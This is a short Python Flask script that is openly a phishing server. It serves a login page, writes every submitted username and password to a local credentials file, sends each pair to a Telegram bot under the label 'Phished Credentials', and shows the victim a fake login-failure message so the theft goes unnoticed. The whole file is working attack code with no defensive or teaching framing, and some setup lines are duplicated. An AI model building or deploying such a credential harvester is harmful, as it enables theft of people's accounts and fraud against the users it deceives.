from flask import Flask, request, render_template
import requests
import os
import subprocess
# Initialize Flask app
app = Flask(__name__)

# Telegram bot configuration
BOT_TOKEN = os.environ.get('BOT_TOKEN')
API_ID = os.getenv("API_ID")  # Telegram API ID
API_HASH = os.getenv("API_HASH")  # Telegram API Hash
# Initialize Flask app
app = Flask(__name__)

# Telegram bot configuration
BOT_TOKEN = os.environ.get('BOT_TOKEN')  # Load from environment for security
CHAT_ID = os.getenv("YOUR_CHAT_ID")      # Load your chat ID

def send_to_telegram(message):
    """Send a message to the designated Telegram bot."""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {'chat_id': CHAT_ID, 'text': message}
    try:
        requests.post(url, data=payload)
    except Exception as e:
        print(f"Error sending message to Telegram: {e}")

@app.route('/')
def home():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')

    # Log credentials locally
    credentials = f"Username: {username}, Password: {password}"
    with open('credentials.txt', 'a') as file:
        file.write(credentials + "\n")
    
    # Send credentials to Telegram
    send_to_telegram(f"Phished Credentials:\n{credentials}")
    
    # Simulate a login failure message
    return "<h1>Invalid login. Please try again.</h1>"

# Ensure this script can be run by a WSGI server
if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
